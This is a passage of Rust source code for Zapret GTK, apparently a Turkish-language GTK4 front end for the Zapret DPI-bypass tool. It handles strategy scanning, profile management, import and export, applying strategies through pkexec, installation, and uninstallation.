            .body(&t("Blockcheck taraması için bir hız ve kapsam seviyesi belirleyin."))
            .build();
        dialog.add_response("quick", &t("Hızlı\n(1 Deneme, Quick)"));
        dialog.add_response("standard", &t("Normal\n(3 Deneme, Standard)"));
        dialog.add_response("force", &t("Detaylı\n(3 Deneme, Force)"));
        dialog.add_response("cancel", &t("Vazgeç"));
        dialog.set_response_appearance("standard", ResponseAppearance::Suggested);
        dialog.set_response_appearance("cancel", ResponseAppearance::Destructive);
        let cf = test_cancel_flag_rescan.clone();
        let nav = nav_view_rescan_test.clone();
        let page = page_test_rescan.clone();
        let lbl = label_test_counter_rescan.clone();
        let lbl_title = label_test_title_rescan.clone();
        let lbl_info = label_test_info_rescan.clone();
        let pid = current_pid_rescan.clone();
        let win = window_clone_rescan.clone();
        let d_vec = domains.clone();
        let nav_mgmt = nav_view_mgmt_rescan.clone();
        let page_mgmt = page_mgmt_rescan.clone();
        let list_mgmt = list_box_mgmt_rescan.clone();
        dialog.connect_response(None, move |d: &adw::MessageDialog, response_id| {
            let (repeats, scan_level) = match response_id {
                "quick" => (1, "quick".to_string()),
                "standard" => (3, "standard".to_string()),
                "force" => (3, "force".to_string()),
                "cancel" | _ => {
                    d.close();
                    return;
                }
            };
            d.close();
            cf.store(false, Ordering::Relaxed);
            let cf_thread = cf.clone();
            lbl_title.set_label(&t("Stratejiler aranıyor..."));
            lbl_info.set_label(&t("Bu işlem internet hızınıza göre zaman alabilir.\nLütfen bekleyiniz."));
            lbl.set_label(&t("Denenen Stratejiler: 0"));
            nav.push(&page);
            let (sender, receiver) = mpsc::channel();
            let d_vec = d_vec.clone();
            thread::spawn(move || {
                run_blockcheck_process(d_vec, repeats, scan_level, sender, cf_thread);
            });
            let pid_timer = pid.clone();
            let nav_timer = nav.clone();
            let lbl_timer = lbl.clone();
            let win_timer = win.clone();
            let list_box_mgmt_timer = list_mgmt.clone();
            let nav_mgmt_timer = nav_mgmt.clone();
            let page_mgmt_timer = page_mgmt.clone();
            let mut count = 0;
            glib::timeout_add_local(Duration::from_millis(50), move || {
                match receiver.try_recv() {
                    Ok(msg) => {
                        match msg {
                            TestMsg::Started(id) => {
                                if let Ok(mut guard) = pid_timer.lock() {
                                    *guard = Some(id);
                                }
                                glib::ControlFlow::Continue
                            },
                            TestMsg::ProgressTick => {
                                count += 1;
                                lbl_timer.set_label(&t("Denenen Stratejiler: {}").replace("{}", &count.to_string()));
                                glib::ControlFlow::Continue
                            },
                            TestMsg::Log(line) => {
                                let short_log = if line.len() > 50 { format!("{}...", &line[..47]) } else { line };
                                lbl_timer.set_label(&short_log);
                                glib::ControlFlow::Continue
                            },
                            TestMsg::Finished(result) => {
                                if let Ok(mut guard) = pid_timer.lock() {
                                    *guard = None;
                                }
                                match result {
                                    Ok(strategies) => {
                                        if strategies.is_empty() {
                                            let dialog = adw::MessageDialog::builder()
                                                .transient_for(&win_timer)
                                                .heading(&t("Strateji Bulunamadı"))
                                                .body(&t("Blockcheck tamamlandı ancak çalışan bir strateji bulunamadı."))
                                                .build();
                                            dialog.add_response("ok", &t("Tamam"));
                                            dialog.connect_response(None, move |d, _| d.close());
                                            dialog.present();
                                            nav_timer.pop();
                                        } else {
                                            let target_id = target_profile_id_rescan;
                                            let profile_strats: Vec<ProfileStrategy> = strategies.iter().map(|s| ProfileStrategy {
                                                strategy: s.clone(),
                                                active: false,
                                            }).collect();
                                            if let Err(e) = save_profile_strategies(target_id, &profile_strats) {
                                                let dialog = adw::MessageDialog::builder()
                                                    .transient_for(&win_timer)
                                                    .heading(&t("Kaydetme Hatası"))
                                                    .body(&t("Dosya kaydedilemedi: {}").replace("{}", &e.to_string()))
                                                    .build();
                                                dialog.add_response("ok", &t("Tamam"));
                                                dialog.connect_response(None, move |d, _| d.close());
                                                dialog.present();
                                            } else {
                                                populate_strategies_box(&list_box_mgmt_timer, &profile_strats);
                                                nav_mgmt_timer.replace(&[page_mgmt_timer.clone()]);
                                                let success_dlg = adw::MessageDialog::builder()
                                                    .transient_for(&win_timer)
                                                    .heading(&t("Başarılı"))
                                                    .body(&t("Yeni stratejiler bulundu ve seçili profile kaydedildi. Listeden kullanmak istediğiniz stratejileri seçip 'Uygula' butonuna basarak aktif edebilirsiniz."))
                                                    .build();
                                                success_dlg.add_response("ok", &t("Tamam"));
                                                success_dlg.connect_response(None, move |d, _| d.close());
                                                success_dlg.present();
                                            }
                                        }
                                    },
                                    Err(e) => {
                                        if e.to_string() != "İptal edildi" {
                                            let dialog = adw::MessageDialog::builder()
                                                .transient_for(&win_timer)
                                                .heading(&t("Hata"))
                                                .body(&t("Arama hatası: {}").replace("{}", &e.to_string()))
                                                .build();
                                            dialog.add_response("ok", &t("Tamam"));
                                            dialog.connect_response(None, move |d, _| d.close());
                                            dialog.present();
                                        }
                                        nav_timer.pop();
                                    }
                                }
                                glib::ControlFlow::Break
                            },
                            _ => glib::ControlFlow::Continue,
                        }
                    },
                    Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
                    Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
                }
            });
        });
        dialog.present();
    });

    let win_about = window.clone();
    about_btn.connect_clicked(move |_| {
        let bytes = glib::Bytes::from_static(ICON_BYTES);
        let texture = gdk::Texture::from_bytes(&bytes).expect("Icon load fail");
        let about = gtk::AboutDialog::builder()
            .transient_for(&win_about)
            .modal(true)
            .program_name("Zapret GTK")
            .version("0.5.3")
            .logo(&texture)
            .comments(&t("Zapret için modern GTK4 arayüzü."))
            .website("https://github.com/Taygun86/zapret-gtk")
            .copyright("© 2026 Zapret GTK")
            .license_type(gtk::License::Gpl30)
            .build();
        about.present();
    });
    let button_clone = button.clone();
    let progress_bar_clone = progress_bar.clone();
    let status_label_clone = status_label.clone();
    let placeholder_label_clone = placeholder_label.clone();
    let dns_warning_label_clone = dns_warning_label.clone();
    let window_clone = window.clone();
    let nav_view_clone = nav_view.clone();
    let page_check_clone = page_check.clone();
    let status_label_check_clone = status_label_check.clone();
    let conflict_list_label_clone = conflict_list_label.clone();
    let force_continue_button_clone = force_continue_button.clone();
    let spinner_check_clone = spinner_check.clone();
    let nav_view_clone_for_check = nav_view.clone();
    let page2_clone_for_check = page2.clone();
    let is_installation_complete = Rc::new(Cell::new(false));
    let is_complete_click = is_installation_complete.clone();
    let is_complete_done = is_installation_complete.clone();
    let is_installing = Rc::new(Cell::new(false));
    let is_installing_click = is_installing.clone();
    let is_installing_direct = is_installing.clone();
    let install_child_pid_btn = install_child_pid.clone();
    let install_child_pid_run = install_child_pid.clone();
    let install_cancel_flag_btn = install_cancel_flag.clone();
    let install_cancel_flag_run = install_cancel_flag.clone();
    let install_cancel_flag_ui = install_cancel_flag.clone();
    let nav_view_clone_mgmt = nav_view.clone();
    let page_mgmt_clone = page_mgmt.clone();
    let list_box_mgmt = strategies_list_box.clone();
    let window_clone_import = window.clone();
    let page_test_clone = page_test.clone();
    let label_test_counter_clone = label_test_counter.clone();
    let label_test_title_clone = label_test_title.clone();
    let label_test_info_clone = label_test_info.clone();
    let nav_view_clone_for_test = nav_view.clone();
    let nav_view_clone_for_force = nav_view.clone();
    let page2_clone_for_force = page2.clone();
    
    let win_delete = window.clone();
    let nav_delete = nav_view.clone();
    let page1_delete = page1.clone();
    let is_installation_complete_delete = is_installation_complete.clone();
    let is_installing_delete = is_installing.clone();
    let button_clone_delete = button.clone();
    let placeholder_label_clone_delete = placeholder_label.clone();
    let dns_warning_label_clone_delete = dns_warning_label.clone();
    let status_label_clone_delete = status_label.clone();
    let progress_bar_clone_delete = progress_bar.clone();
    let list_box_mgmt_delete = strategies_list_box.clone();
    let curr_p_del = current_profile_id.clone();
    let profile_btns_del = profile_btns_rc.clone();
    
    delete_btn.connect_clicked(move |_| {
         let dialog = adw::MessageDialog::builder()
            .transient_for(&win_delete)
            .heading(&t("Uyarı"))
            .body(&t("Zapret'i silmek istediğinize emin misiniz?\nBulunan stratejiler dahil Zapret silinecek (Dışa aktarmayı unutmayın!)."))
            .build();
        dialog.add_response("cancel", &t("İptal"));
        dialog.add_response("delete", &t("Zapret'i Sil"));
        dialog.set_response_appearance("delete", ResponseAppearance::Destructive);
        
        let nav = nav_delete.clone();
        let p1 = page1_delete.clone();
        let win_err = win_delete.clone();
        let is_comp_del = is_installation_complete_delete.clone();
        let is_inst_del = is_installing_delete.clone();
        let btn_del = button_clone_delete.clone();
        let pl_del = placeholder_label_clone_delete.clone();
        let dns_del = dns_warning_label_clone_delete.clone();
        let st_del = status_label_clone_delete.clone();
        let pb_del = progress_bar_clone_delete.clone();
        let list_del = list_box_mgmt_delete.clone();
        let curr_p_del = curr_p_del.clone();
        let profile_btns_del = profile_btns_del.clone();
        
        dialog.connect_response(None, move |d, response| {
            if response == "delete" {
                 log_to_file("User initiated Zapret deletion.");
                 let res = Command::new("pkexec")
                    .arg(get_zapret_control_path())
                    .arg("uninstall")
                    .output();
                    
                 match res {
                    Ok(_) => {
                        d.close();
                        if let Some(proj_dirs) = ProjectDirs::from("com", "Taygun86", "zapret-gtk") {
                            let _ = fs::remove_dir_all(proj_dirs.config_dir());
                        }
                        reset_profile_ui_to_1(&curr_p_del, &profile_btns_del);
                        is_comp_del.set(false);
                        is_inst_del.set(false);
                        btn_del.set_label(&t("Kuruluma Başla"));
                        btn_del.remove_css_class("success");
                        btn_del.remove_css_class("warning");
                        btn_del.remove_css_class("destructive-action");
                        btn_del.add_css_class("suggested-action");
                        btn_del.set_sensitive(true);

                        pl_del.set_label(&t("Zapret DPI bypass yazılımını kurmak ve yapılandırmak için başlayın."));
                        pl_del.set_visible(true);
                        dns_del.set_visible(true);

                        st_del.set_label(&t("Hazır"));
                        st_del.set_visible(false);
                        st_del.remove_css_class("error");
                        st_del.remove_css_class("success");

                        pb_del.set_fraction(0.0);
                        pb_del.set_visible(false);

                        while let Some(child) = list_del.first_child() {
                            list_del.remove(&child);
                        }

                        nav.replace(&[p1.clone()]);
                    },
                    Err(e) => {
                         d.close();
                         let err_dialog = adw::MessageDialog::builder()
                            .transient_for(&win_err)
                            .heading(&t("Hata"))
                            .body(&t("Silme işlemi başarısız: {}").replace("{}", &e.to_string()))
                            .build();
                        err_dialog.add_response("ok", &t("Tamam"));
                        err_dialog.present();
                    }
                 }
            } else {
                d.close();
            }
        });
        dialog.present();
    });

    let curr_p_import = current_profile_id.clone();
    let win_import_status = window.clone();
    let strategies_list_box_status = strategies_list_box.clone();
    import_button_status.connect_clicked(move |_| {
        let file_dialog = gtk::FileDialog::builder()
            .title(&t("Strateji Dosyası Seç"))
            .modal(true)
            .build();
        let filter = FileFilter::new();
        filter.set_name(Some(&t("JSON Dosyaları")));
        filter.add_pattern("*.json");
        let filters = gtk::gio::ListStore::new::<FileFilter>();
        filters.append(&filter);
        file_dialog.set_filters(Some(&filters));
        file_dialog.set_default_filter(Some(&filter));

        let win_import_status_c = win_import_status.clone();
        let strategies_list_box_status_c = strategies_list_box_status.clone();
        let win_import_status_closure = win_import_status_c.clone();
        let curr_p_c = curr_p_import.clone();
        file_dialog.open(Some(&win_import_status_c), None::<&gtk::gio::Cancellable>, move |result| {
             if let Ok(file) = result {
                if let Some(path) = file.path() {
                    let target_id = curr_p_c.get();
                    match validate_and_copy_strategies(&path, target_id) {
                        Ok(_) => {
                            let loaded = load_profile_strategies(target_id);
                            populate_strategies_box(&strategies_list_box_status_c, &loaded);
                            let dialog = adw::MessageDialog::builder()
                                .transient_for(&win_import_status_closure)
                                .heading(&t("Başarılı"))
                                .body(&t("Stratejiler içe aktarıldı."))
                                .build();
                            dialog.add_response("ok", &t("Tamam"));
                            dialog.connect_response(None, move |d, _| { d.close(); });
                            dialog.present();
                        },
                        Err(e) => {
                            let dialog = adw::MessageDialog::builder()
                                .transient_for(&win_import_status_closure)
                                .heading(&t("Hata"))
                                .body(&e.to_string())
                                .build();
                            dialog.add_response("ok", &t("Tamam"));
                            dialog.connect_response(None, move |d, _| { d.close(); });
                            dialog.present();
                        }
                    }
                }
             }
        });
    });
    let win_export = window.clone();
    let curr_p_export = current_profile_id.clone();
    export_button.connect_clicked(move |_| {
        let target_id = curr_p_export.get();
        let target_path = get_profile_path(target_id);
        if !target_path.exists() {
             let dialog = adw::MessageDialog::builder()
                .transient_for(&win_export)
                .heading(&t("Hata"))
                .body(&t("Henüz kaydedilmiş strateji bulunmuyor."))
                .build();
            dialog.add_response("ok", &t("Tamam"));
            dialog.present();
            return;
        }
        let file_dialog = gtk::FileDialog::builder()
            .title(&t("Stratejileri Kaydet"))
            .initial_name(&format!("strategies_profile_{}.json", target_id))
            .modal(true)
            .accept_label(&t("Kaydet"))
            .build();
        let win_export_c = win_export.clone();
        file_dialog.save(Some(&win_export), None::<&gtk::gio::Cancellable>, move |result| {
             if let Ok(file) = result {
                if let Some(path) = file.path() {
                    match fs::copy(&target_path, &path) {
                        Ok(_) => {
                             let dialog = adw::MessageDialog::builder()
                                .transient_for(&win_export_c)
                                .heading(&t("Başarılı"))
                                .body(&t("Dosya dışa aktarıldı."))
                                .build();
                            dialog.add_response("ok", &t("Tamam"));
                            dialog.present();
                        },
                        Err(e) => {
                             let dialog = adw::MessageDialog::builder()
                                .transient_for(&win_export_c)
                                .heading(&t("Hata"))
                                .body(&t("Dosya kaydedilemedi: {}").replace("{}", &e.to_string()))
                                .build();
                            dialog.add_response("ok", &t("Tamam"));
                            dialog.present();
                        }
                    }
                }
             }
        });
    });
    for id in 1..=10 {
        let btn = &profile_btns_rc[id - 1];
        let curr_p = current_profile_id.clone();
        let list_box = strategies_list_box.clone();
        let all_btns = profile_btns_rc.clone();
        btn.connect_clicked(move |_| {
            let old_id = curr_p.get();
            if old_id == id {
                return;
            }
            let current_items = extract_strategies_from_list_box(&list_box);
            if !current_items.is_empty() {
                let _ = save_profile_strategies(old_id, &current_items);
            }

            curr_p.set(id);

            for (idx, b) in all_btns.iter().enumerate() {
                if idx + 1 == id {
                    b.add_css_class("suggested-action");
                } else {
                    b.remove_css_class("suggested-action");
                }
            }

            let mut child = list_box.first_child();
            while let Some(widget) = child {
                let next = widget.next_sibling();
                list_box.remove(&widget);
                child = next;
            }

            let items = load_profile_strategies(id);
            for item in items {
                let child_label = Label::builder()
                    .label(&item.strategy)
                    .wrap(true)
                    .max_width_chars(50)
                    .xalign(0.0)
                    .build();
                let check = CheckButton::builder()
                    .child(&child_label)
                    .active(item.active)
                    .margin_top(10)
                    .margin_bottom(10)
                    .margin_start(10)
                    .margin_end(10)
                    .build();
                list_box.append(&check);
            }
        });
    }

    let list_box_apply = strategies_list_box.clone();
    let win_apply = window.clone();
    let curr_p_apply = current_profile_id.clone();
    apply_button.connect_clicked(move |_| {
        let all_strategies = extract_strategies_from_list_box(&list_box_apply);
        let selected_strategies: Vec<String> = all_strategies.iter()
            .filter(|s| s.active)
            .map(|s| s.strategy.clone())
            .collect();
        let current_id = curr_p_apply.get();
        if !all_strategies.is_empty() {
            let _ = save_profile_strategies(current_id, &all_strategies);
        }

        if selected_strategies.is_empty() {
             let dialog = adw::MessageDialog::builder()
                .transient_for(&win_apply)
                .heading(&t("Uyarı"))
                .body(&t("Lütfen en az bir strateji seçin."))
                .build();
            dialog.add_response("ok", &t("Tamam"));
            dialog.present();
            return;
        }

        for strat in &selected_strategies {
            if !is_safe_strategy_param(strat) {
                let dialog = adw::MessageDialog::builder()
                    .transient_for(&win_apply)
                    .heading(&t("Güvenlik Uyarısı"))
                    .body(&t("Geçersiz veya güvensiz karakterler içeren strateji tespit edildi."))
                    .build();
                dialog.add_response("ok", &t("Tamam"));
                dialog.present();
                return;
            }
        }

        let combined_strategies = selected_strategies.join(" ");
        let formatted_strat = format_strategy_with_hostlist(&combined_strategies);
        if !is_safe_strategy_param(&formatted_strat) {
            let dialog = adw::MessageDialog::builder()
                .transient_for(&win_apply)
                .heading(&t("Güvenlik Uyarısı"))
                .body(&t("Biçimlendirilmiş strateji geçerli değil."))
                .build();
            dialog.add_response("ok", &t("Tamam"));
            dialog.present();
            return;
        }

        println!("Applying profile {}: {}", current_id, formatted_strat);
        log_to_file(&format!("Applying profile {} strategies: {}", current_id, formatted_strat));

        let mut strat_child = match Command::new("pkexec")
            .arg(get_zapret_control_path())
            .arg("apply-strategy")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn() {
                Ok(c) => c,
                Err(e) => {
                    let dialog = adw::MessageDialog::builder()
                        .transient_for(&win_apply)
                        .heading(&t("Hata"))
                        .body(&t("Komut hatası: {}").replace("{}", &e.to_string()))
                        .build();
                    dialog.add_response("ok", &t("Tamam"));
                    dialog.present();
                    return;
                }
            };

        if let Some(mut stdin) = strat_child.stdin.take() {
            let _ = writeln!(stdin, "{}", formatted_strat);
        }

        let strat_res = strat_child.wait_with_output();
        match strat_res {
            Ok(output) if output.status.success() => {},
            Ok(output) => {
                let err = String::from_utf8_lossy(&output.stderr);
                log_to_file(&format!("Apply strategy error: {}", err));
                let dialog = adw::MessageDialog::builder()
                    .transient_for(&win_apply)
                    .heading(&t("Hata"))
                    .body(&t("Strateji uygulanamadı:\n{}").replace("{}", &err))
                    .build();
                dialog.add_response("ok", &t("Tamam"));
                dialog.present();
                return;
            },
            Err(e) => {
                let dialog = adw::MessageDialog::builder()
                    .transient_for(&win_apply)
                    .heading(&t("Hata"))
                    .body(&t("Komut hatası: {}").replace("{}", &e.to_string()))
                    .build();
                dialog.add_response("ok", &t("Tamam"));
                dialog.present();
                return;
            }
        }

        if let Err(e) = apply_profile_hostlist_to_zapret(current_id) {
            log_to_file(&format!("Apply hostlist error: {}", e));
            let dialog = adw::MessageDialog::builder()
                .transient_for(&win_apply)
                .heading(&t("Hata"))
                .body(&t("Hostlist uygulanamadı:\n{}").replace("{}", &e.to_string()))
                .build();
            dialog.add_response("ok", &t("Tamam"));
            dialog.present();
            return;
        }

        log_to_file("Config file updated successfully and service restarted.");
        save_active_profile_id(current_id);
        let dialog = adw::MessageDialog::builder()
            .transient_for(&win_apply)
            .heading(&t("Başarılı"))
            .body(&t("Profil {} stratejileri uygulandı ve Zapret servisi yeniden başlatıldı.").replace("{}", &current_id.to_string()))
            .build();
        dialog.add_response("ok", &t("Tamam"));
        dialog.present();
    });
    let active_profile_init = get_active_profile_id();
    if Path::new("/opt/zapret").exists() && (get_config_path().exists() || get_profile_path(1).exists()) {
        delete_local_zapret_folder();
        let loaded = load_profile_strategies(active_profile_init);
        if !loaded.is_empty() {
            populate_strategies_box(&strategies_list_box, &loaded);
            nav_view.push(&page_mgmt);
        }
    }
    button.connect_clicked(move |_| {
        if is_installing_click.get() {
            install_cancel_flag_btn.store(true, Ordering::Relaxed);
            let pid_opt = install_child_pid_btn.lock().ok().and_then(|g| *g);
            let pid_str = pid_opt.map(|p| p.to_string()).unwrap_or_else(|| "0".to_string());
            let _ = Command::new("pkexec")
                .arg(get_zapret_control_path())
                .arg("kill-pid")
                .arg(pid_str)
                .spawn();
            is_installing_click.set(false);
            button_clone.set_label(&t("Kuruluma Başla"));
            button_clone.remove_css_class("destructive-action");
            button_clone.remove_css_class("warning");
            button_clone.remove_css_class("error");
            button_clone.add_css_class("suggested-action");
            button_clone.set_sensitive(true);
            placeholder_label_clone.set_visible(true);
            dns_warning_label_clone.set_visible(true);
            progress_bar_clone.set_visible(false);
            status_label_clone.set_label(&t("Hazır"));
            status_label_clone.set_visible(false); 
            return;
        }
        if is_complete_click.get() {
            nav_view_clone.replace(&[page_check_clone.clone()]);
            status_label_check_clone.set_label(&t("Sistem ve VPN çakışmaları taranıyor..."));
            status_label_check_clone.remove_css_class("error");
            status_label_check_clone.remove_css_class("success");
            conflict_list_label_clone.set_label("");
            force_continue_button_clone.set_visible(false);
            spinner_check_clone.set_spinning(true);
            spinner_check_clone.set_visible(true);
            let (tx, rx) = mpsc::channel();
            thread::spawn(move || {
                thread::sleep(Duration::from_secs(1));
                let conflicts = check_processes();
                let _ = tx.send(conflicts);
            });
            let lbl = status_label_check_clone.clone();
            let lst = conflict_list_label_clone.clone();
            let btn = force_continue_button_clone.clone();
            let spn = spinner_check_clone.clone();
            let nav = nav_view_clone_for_check.clone();
            let p2 = page2_clone_for_check.clone();
            glib::timeout_add_local(Duration::from_millis(100), move || {
                match rx.try_recv() {
                    Ok(conflicts) => {
                        spn.set_spinning(false);
                        spn.set_visible(false);
                        if conflicts.is_empty() {
                            lbl.set_label(&t("Sorun bulunmadı."));
                            lbl.add_css_class("success");
                            let n = nav.clone();
                            let p = p2.clone();
                            glib::timeout_add_local(Duration::from_millis(800), move || {
                                n.replace(&[p.clone()]);
                                glib::ControlFlow::Break
                            });
                        } else {
                            lbl.set_label(&t("Çakışan Uygulamalar Tespit Edildi!"));
                            lbl.add_css_class("error");
                            let list_str = conflicts.join(", ");
                            lst.set_label(&t("Şu servisler kapatılmalı: {}").replace("{}", &list_str));
                            btn.set_visible(true);
                        }
                        glib::ControlFlow::Break
                    },
                    Err(mpsc::TryRecvError::Empty) => glib::ControlFlow::Continue,
                    Err(mpsc::TryRecvError::Disconnected) => glib::ControlFlow::Break,
                }
            });
            return;
        }
        let _zapret_path = get_zapret_path();
        
        let window_clone_inner = window_clone.clone();
        let button_clone_inner = button_clone.clone();
        let progress_bar_clone_inner = progress_bar_clone.clone();
        let status_label_clone_inner = status_label_clone.clone();
        let placeholder_label_clone_inner = placeholder_label_clone.clone();
        let dns_warning_label_clone_inner = dns_warning_label_clone.clone();
        let is_complete_done_inner = is_complete_done.clone();
        let is_installing_direct_inner = is_installing_direct.clone();
        let install_child_pid_run_inner = install_child_pid_run.clone();
        let install_cancel_flag_run_inner = install_cancel_flag_run.clone();
        let install_cancel_flag_ui_inner = install_cancel_flag_ui.clone();

        let run_installation_flow = Rc::new(move |set_dns: bool| {
            let zapret_path = get_zapret_path();
            if zapret_path.exists() {
                let dialog = adw::MessageDialog::builder()
                    .transient_for(&window_clone_inner)
                    .modal(true)
                    .heading(&t("Klasör Bulundu"))
                    .body(&t("Mevcut bir 'zapret' klasörü tespit edildi. Ne yapmak istersiniz?"))
                    .build();
                dialog.add_response("cancel", &t("İptal"));
                dialog.add_response("accept", &t("Mevcut Olanı Kullan"));
                dialog.add_response("reject", &t("Sil ve İndir"));
                dialog.set_response_appearance("reject", ResponseAppearance::Destructive);
                dialog.set_response_appearance("accept", ResponseAppearance::Suggested);
                let btn_c = button_clone_inner.clone();
                let pb_c = progress_bar_clone_inner.clone();
                let lbl_c = status_label_clone_inner.clone();
                let pl_c = placeholder_label_clone_inner.clone();
                let dns_c = dns_warning_label_clone_inner.clone();
                let is_comp = is_complete_done_inner.clone();
                let is_inst = is_installing_direct_inner.clone();
                let pid_store = install_child_pid_run_inner.clone();
                let cancel_flg = install_cancel_flag_run_inner.clone();
                let cancel_flg_ui = install_cancel_flag_ui_inner.clone();
                dialog.connect_response(None, move |d, response_id| {
                    match response_id {
                        "reject" => {
                            d.close();
                            run_installation(btn_c.clone(), pb_c.clone(), lbl_c.clone(), pl_c.clone(), dns_c.clone(), true, is_comp.clone(), is_inst.clone(), pid_store.clone(), cancel_flg.clone(), cancel_flg_ui.clone(), set_dns);
                        },
                        "accept" => {
                            d.close();
                            run_installation(btn_c.clone(), pb_c.clone(), lbl_c.clone(), pl_c.clone(), dns_c.clone(), false, is_comp.clone(), is_inst.clone(), pid_store.clone(), cancel_flg.clone(), cancel_flg_ui.clone(), set_dns);
                        },
                        _ => {
                            d.close();
                        }
                    }
                });
                dialog.present();
            } else {
                run_installation(button_clone_inner.clone(), progress_bar_clone_inner.clone(), status_label_clone_inner.clone(), placeholder_label_clone_inner.clone(), dns_warning_label_clone_inner.clone(), false, is_complete_done_inner.clone(), is_installing_direct_inner.clone(), install_child_pid_run_inner.clone(), install_cancel_flag_run_inner.clone(), install_cancel_flag_ui_inner.clone(), set_dns);
            }
        });

        let has_existing_opt_zapret = Path::new("/opt/zapret").exists();
        let win_for_dns = window_clone.clone();
        let flow_for_dns = run_installation_flow.clone();
        let start_install_with_dns_check = Rc::new(move || {
            if check_network_manager() {
                let dialog = adw::MessageDialog::builder()
                    .transient_for(&win_for_dns) 
                    .heading(&t("DNS Ayarı"))
                    .body(&t("Mevcut DNS adresiniz Cloudflare ile değiştirilsin mi? (Bu işlemin ne anlama geldiğini bilmiyorsanız 'Evet' butonuna tıklayarak devam edebilirsiniz.)"))
                    .build();
                dialog.add_response("no", &t("Hayır"));
                dialog.add_response("yes", &t("Evet"));
                dialog.set_response_appearance("yes", ResponseAppearance::Suggested);
                
                let flow_clone = flow_for_dns.clone();
                dialog.connect_response(None, move |d, response_id| {
                    d.close();
                    let set_dns = response_id == "yes";
                    flow_clone(set_dns);
                });
                dialog.present();
            } else {
                flow_for_dns(false);
            }
        });

        if has_existing_opt_zapret {
            let warn_dialog = adw::MessageDialog::builder()
                .transient_for(&window_clone)
                .heading(&t("Mevcut Kurulum Tespit Edildi"))
                .body(&t("Sistemde önceden kurulmuş bir Zapret tespit edildi. Kuruluma devam ederseniz mevcut kurulum ve servislerin üzerine yazılacaktır. Devam etmek istiyor musunuz?"))
                .build();
            warn_dialog.add_response("cancel", &t("Vazgeç"));
            warn_dialog.add_response("continue", &t("Devam Et"));
            warn_dialog.set_response_appearance("cancel", ResponseAppearance::Destructive);
            warn_dialog.set_response_appearance("continue", ResponseAppearance::Suggested);
            let start_cb = start_install_with_dns_check.clone();
            warn_dialog.connect_response(None, move |d, response| {
                d.close();
                if response == "continue" {
                    start_cb();
                }
            });
            warn_dialog.present();
        } else {
            start_install_with_dns_check();
        }
    });
    force_continue_button.connect_clicked(move |_| {
        nav_view_clone_for_force.replace(&[page2_clone_for_force.clone()]);
    });
    let current_pid_cancel = current_pid.clone();
    let nav_view_clone_cancel = nav_view.clone();
    let test_cancel_flag_btn = test_cancel_flag.clone();
    let _test_cancel_flag_run = test_cancel_flag.clone();
    test_cancel_button.connect_clicked(move |_| {
        test_cancel_flag_btn.store(true, Ordering::Relaxed);
        let pid_opt = current_pid_cancel.lock().ok().and_then(|g| *g);
        let pid_str = pid_opt.map(|p| p.to_string()).unwrap_or_else(|| "0".to_string());
        println!("Canceling process... PID: {}", pid_str);
        log_to_file(&format!("Process cancelling... PID: {}", pid_str));
        let _ = Command::new("pkexec")
            .arg(get_zapret_control_path())
            .arg("kill-pid")
            .arg(pid_str)
            .spawn();
        nav_view_clone_cancel.pop();
    });
    let window_clone_preset = window.clone();
    let nav_view_clone_preset_btn = nav_view.clone();
    let page_test_clone_preset = page_test.clone();
    let lbl_test_clone_preset = label_test_counter.clone();
    let lbl_title_preset = label_test_title.clone();
    let lbl_info_preset = label_test_info.clone();
    let pid_clone_preset = current_pid.clone();
    let cf_clone_preset = test_cancel_flag.clone();
    let nav_mgmt_preset = nav_view_clone_mgmt.clone();
    let page_mgmt_preset = page_mgmt_clone.clone();
    let list_mgmt_preset = list_box_mgmt.clone();
    let curr_p_preset_btn = current_profile_id.clone();
    let profile_btns_preset_btn = profile_btns_rc.clone();

    preset_button.connect_clicked(move |_| {
        let dialog = adw::MessageDialog::builder()
            .transient_for(&window_clone_preset)
            .heading(&t("Hazır Stratejileri Yükle"))
            .body(&t("Bu stratejiler çoğu durumda çalışır ancak her internet servis sağlayıcısında veya ağda çalışmayabilir.\n\nYine de devam edip kurmak istiyor musunuz?"))
            .build();
        dialog.add_response("cancel", &t("İptal"));
        dialog.add_response("confirm", &t("Evet, Devam Et"));
        dialog.set_response_appearance("confirm", ResponseAppearance::Suggested);

        let nav = nav_view_clone_preset_btn.clone();
        let page = page_test_clone_preset.clone();
        let lbl = lbl_test_clone_preset.clone();
        let lbl_title = lbl_title_preset.clone();
        let lbl_info = lbl_info_preset.clone();
        let pid = pid_clone_preset.clone();
        let cf = cf_clone_preset.clone();
        let list_box_mgmt_timer = list_mgmt_preset.clone();
        let nav_mgmt_timer = nav_mgmt_preset.clone();
        let page_mgmt_timer = page_mgmt_preset.clone();
        let win_timer = window_clone_preset.clone();
        let win_err = window_clone_preset.clone();

        let curr_p_preset = curr_p_preset_btn.clone();
        let profile_btns_preset = profile_btns_preset_btn.clone();

        dialog.connect_response(None, move |d, response| {
            if response == "confirm" {
                d.close();
                match apply_preset_strategies_to_profile(1) {
                    Ok(_) => {
                        cf.store(false, Ordering::Relaxed);
                        lbl_title.set_label(&t("Zapret Kuruluyor..."));
                        lbl_info.set_label(&t("Zapret dosyaları ve yapılandırması hazırlanıyor.\nLütfen bekleyiniz."));
                        lbl.set_label(&t("Kurulum hazırlanıyor..."));
                        nav.push(&page);
                        let (sender, receiver) = mpsc::channel();
                        let sender_thread = sender.clone();
                        let cf_thread = cf.clone();
                        thread::spawn(move || {
                            run_easy_install_script(sender_thread, cf_thread);
                        });
                        let nav_timer = nav.clone();
                        let win_timer = win_timer.clone();
                        let pid_timer = pid.clone();
                        let lbl_timer = lbl.clone();
                        let list_box_timer = list_box_mgmt_timer.clone();
                        let nav_mgmt_t = nav_mgmt_timer.clone();
                        let page_mgmt_t = page_mgmt_timer.clone();
                        let curr_p_preset = curr_p_preset.clone();
                        let profile_btns_preset = profile_btns_preset.clone();
                        glib::timeout_add_local(Duration::from_millis(50), move || {
                            match receiver.try_recv() {
                                Ok(msg) => {
                                    match msg {
                                        TestMsg::Started(id) => {
                                            if let Ok(mut guard) = pid_timer.lock() {
                                                *guard = Some(id);
                                            }
                                            glib::ControlFlow::Continue
                                        },
                                        TestMsg::Log(line) => {
                                            let short_log = if line.len() > 50 { format!("{}...", &line[..47]) } else { line };
                                            lbl_timer.set_label(&short_log);
                                            glib::ControlFlow::Continue
                                        },
                                        TestMsg::InstallFinished(result) => {
                                            if let Ok(mut guard) = pid_timer.lock() {
                                                *guard = None;
                                            }
                                            nav_timer.pop();
